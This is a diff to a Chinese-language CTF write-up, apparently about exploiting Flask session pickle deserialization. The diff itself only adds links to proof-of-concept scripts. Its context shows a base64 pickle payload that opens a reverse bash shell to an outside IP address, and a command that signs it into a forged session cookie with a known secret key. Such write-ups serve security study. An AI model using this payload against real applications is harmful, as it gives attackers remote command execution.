@@ -30,13 +30,13 @@ CTFHUBCTFHUBCTFHUB
 
 ## 反序列化复现
 
-- [*command.py*(点击查看代码)]() 生成base64加密命令：
+- [*command.py*(点击查看代码)](https://github.com/Bin4xin/bigger-than-bigger/blob/master/CoVV/Flask/poc/command.py) 生成base64加密命令：
 ```
 ➜ python command.py
 Y19fYnVpbHRpbl9fCmV2YWwKcDAKKFMiX19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2Jhc2ggLWkgPiYvZGV2L3RjcC80Ny43NC4zMS42NC8xMTAwMSAwPiYgMScpIgpwMQp0cDIKUnAzCi4=
 ```
 
-- [*flask_manage_python3.py*(点击查看代码)]() 生成攻击反序列化session值：
+- [*flask_manage_python3.py*(点击查看代码)](https://github.com/Bin4xin/bigger-than-bigger/blob/master/CoVV/Flask/poc/flask_manage_python3.py) 生成攻击反序列化session值：
 
 ```
 ➜ python3 flask_manage_python3.py encode -t "{'u':{'b':'Y19fYnVpbHRpbl9fCmV2YWwKcDAKKFMiX19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2Jhc2ggLWkgPiYvZGV2L3RjcC80Ny43NC4zMS42NC8xMTAwMSAwPiYgMScpIgpwMQp0cDIKUnAzCi4='}}" -s 'CTFHUBCTFHUBCTFHUB'
